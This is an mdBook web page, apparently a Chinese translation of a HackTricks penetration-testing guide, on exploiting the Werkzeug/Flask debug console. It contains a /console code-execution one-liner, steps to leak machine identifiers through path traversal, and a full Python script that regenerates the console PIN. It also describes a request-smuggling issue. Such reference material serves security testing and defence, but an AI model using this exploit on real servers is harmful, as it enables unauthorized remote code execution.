<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Werkzeug / Flask Debug</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="werkzeug--flask-debug"><a class="header" href="#werkzeug--flask-debug">Werkzeug / Flask Debug</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度审视您的网络应用、网络和云</strong></p>
<p><strong>发现并报告具有实际商业影响的关键可利用漏洞。</strong> 使用我们 20 多个自定义工具来绘制攻击面，查找允许您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="控制台-rce"><a class="header" href="#控制台-rce">控制台 RCE</a></h2>
<p>如果调试处于活动状态，您可以尝试访问 <code>/console</code> 并获得 RCE。</p>
<pre><code class="language-python">__import__('os').popen('whoami').read();
</code></pre>
<p><img src="../../.gitbook/assets/image%20(117).png" alt="" /></p>
<p>互联网上还有几个漏洞，比如<a href="https://github.com/its-arun/Werkzeug-Debug-RCE">这个</a>或metasploit中的一个。</p>
<h2 id="pin-保护---路径遍历"><a class="header" href="#pin-保护---路径遍历">Pin 保护 - 路径遍历</a></h2>
<p>在某些情况下，<strong><code>/console</code></strong> 端点将受到 pin 的保护。如果你有 <strong>文件遍历漏洞</strong>，你可以泄露生成该 pin 所需的所有信息。</p>
<h3 id="werkzeug-控制台-pin-漏洞"><a class="header" href="#werkzeug-控制台-pin-漏洞">Werkzeug 控制台 PIN 漏洞</a></h3>
<p>在应用中强制生成调试错误页面以查看此内容：</p>
<pre><code>The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
</code></pre>
<p>在尝试访问 Werkzeug 的调试接口时，会遇到关于“控制台锁定”场景的消息，指示需要一个 PIN 来解锁控制台。建议通过分析 Werkzeug 的调试初始化文件 (<code>__init__.py</code>) 中的 PIN 生成算法来利用控制台 PIN。可以从 <a href="https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py"><strong>Werkzeug 源代码库</strong></a> 研究 PIN 生成机制，但建议通过文件遍历漏洞获取实际服务器代码，以避免潜在的版本差异。</p>
<p>要利用控制台 PIN，需要两组变量，<code>probably_public_bits</code> 和 <code>private_bits</code>：</p>
<h4 id="probably_public_bits"><a class="header" href="#probably_public_bits"><strong><code>probably_public_bits</code></strong></a></h4>
<ul>
<li><strong><code>username</code></strong>：指发起 Flask 会话的用户。</li>
<li><strong><code>modname</code></strong>：通常指定为 <code>flask.app</code>。</li>
<li><strong><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code></strong>：通常解析为 <strong>Flask</strong>。</li>
<li><strong><code>getattr(mod, '__file__', None)</code></strong>：表示 Flask 目录中 <code>app.py</code> 的完整路径（例如，<code>/usr/local/lib/python3.5/dist-packages/flask/app.py</code>）。如果 <code>app.py</code> 不适用，<strong>尝试 <code>app.pyc</code></strong>。</li>
</ul>
<h4 id="private_bits"><a class="header" href="#private_bits"><strong><code>private_bits</code></strong></a></h4>
<ul>
<li><strong><code>uuid.getnode()</code></strong>：获取当前机器的 MAC 地址，<code>str(uuid.getnode())</code> 将其转换为十进制格式。</li>
<li>要 <strong>确定服务器的 MAC 地址</strong>，必须识别应用使用的活动网络接口（例如，<code>ens3</code>）。如果不确定，<strong>泄露 <code>/proc/net/arp</code></strong> 以查找设备 ID，然后 <strong>从 <code>/sys/class/net/&lt;device id&gt;/address</code> 提取 MAC 地址</strong>。</li>
<li>可以按如下方式将十六进制 MAC 地址转换为十进制：</li>
</ul>
<pre><code class="language-python"># 示例 MAC 地址: 56:00:02:7a:23:ac
&gt;&gt;&gt; print(0x5600027a23ac)
94558041547692
</code></pre>
<ul>
<li><strong><code>get_machine_id()</code></strong>：将 <code>/etc/machine-id</code> 或 <code>/proc/sys/kernel/random/boot_id</code> 中的数据与 <code>/proc/self/cgroup</code> 的第一行在最后一个斜杠（<code>/</code>）之后的部分连接起来。</li>
</ul>
<details>
<summary>`get_machine_id()` 的代码</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id
<p>if _machine_id is not None:
return _machine_id</p>
<p>def _generate() -&gt; t.Optional[t.Union[str, bytes]]:
linux = b""</p>
<h1 id="machine-id-is-stable-across-boots-boot_id-is-not"><a class="header" href="#machine-id-is-stable-across-boots-boot_id-is-not">machine-id is stable across boots, boot_id is not.</a></h1>
<p>for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue</p>
<p>if value:
linux += value
break</p>
<h1 id="containers-share-the-same-machine-id-add-some-cgroup"><a class="header" href="#containers-share-the-same-machine-id-add-some-cgroup">Containers share the same machine id, add some cgroup</a></h1>
<h1 id="information-this-is-used-outside-containers-too-but-should-be"><a class="header" href="#information-this-is-used-outside-containers-too-but-should-be">information. This is used outside containers too but should be</a></h1>
<h1 id="relatively-stable-across-boots"><a class="header" href="#relatively-stable-across-boots">relatively stable across boots.</a></h1>
<p>try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass</p>
<p>if linux:
return linux</p>
<h1 id="on-os-x-use-ioreg-to-get-the-computers-serial-number"><a class="header" href="#on-os-x-use-ioreg-to-get-the-computers-serial-number">On OS X, use ioreg to get the computer's serial number.</a></h1>
<p>try:</p>
<pre><code>&lt;/details&gt;

在收集所有必要数据后，可以执行漏洞利用脚本以生成 Werkzeug 控制台 PIN：

在收集所有必要数据后，可以执行漏洞利用脚本以生成 Werkzeug 控制台 PIN。该脚本使用组装的 `probably_public_bits` 和 `private_bits` 创建一个哈希，然后经过进一步处理以生成最终的 PIN。以下是执行此过程的 Python 代码：
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
</code></pre>
<p>这个脚本通过对连接的位进行哈希，添加特定的盐（<code>cookiesalt</code> 和 <code>pinsalt</code>），并格式化输出，生成 PIN。需要注意的是，<code>probably_public_bits</code> 和 <code>private_bits</code> 的实际值需要从目标系统准确获取，以确保生成的 PIN 与 Werkzeug 控制台预期的匹配。</p>
<p>{% hint style="success" %}
如果您使用的是 <strong>旧版本</strong> 的 Werkzeug，请尝试将 <strong>哈希算法更改为 md5</strong> 而不是 sha1。
{% endhint %}</p>
<h2 id="werkzeug-unicode-字符"><a class="header" href="#werkzeug-unicode-字符">Werkzeug Unicode 字符</a></h2>
<p>正如在 <a href="https://github.com/pallets/werkzeug/issues/2833"><strong>这个问题</strong></a> 中观察到的，Werkzeug 不会关闭带有 Unicode 字符的请求。正如在 <a href="https://mizu.re/post/twisty-python"><strong>这篇文章</strong></a> 中解释的，这可能导致 CL.0 请求走私漏洞。</p>
<p>这是因为，在 Werkzeug 中可以发送一些 <strong>Unicode</strong> 字符，这会导致服务器 <strong>崩溃</strong>。然而，如果 HTTP 连接是通过 <strong><code>Connection: keep-alive</code></strong> 头创建的，请求的主体将不会被读取，连接仍将保持打开状态，因此请求的 <strong>主体</strong> 将被视为 <strong>下一个 HTTP 请求</strong>。</p>
<h2 id="自动化利用"><a class="header" href="#自动化利用">自动化利用</a></h2>
<p>{% embed url="https://github.com/Ruulian/wconsole_extractor" %}</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://www.daehee.com/werkzeug-console-pin-exploit/"><strong>https://www.daehee.com/werkzeug-console-pin-exploit/</strong></a></li>
<li><a href="https://ctftime.org/writeup/17955"><strong>https://ctftime.org/writeup/17955</strong></a></li>
<li><a href="https://github.com/pallets/werkzeug/issues/2833"><strong>https://github.com/pallets/werkzeug/issues/2833</strong></a></li>
<li><a href="https://mizu.re/post/twisty-python"><strong>https://mizu.re/post/twisty-python</strong></a></li>
</ul>
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>获取黑客对您的网络应用、网络和云的看法</strong></p>
<p><strong>发现并报告具有实际商业影响的关键可利用漏洞。</strong> 使用我们 20 多个自定义工具来映射攻击面，查找让您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/put-method-webdav.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/wordpress.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/put-method-webdav.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-web/wordpress.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
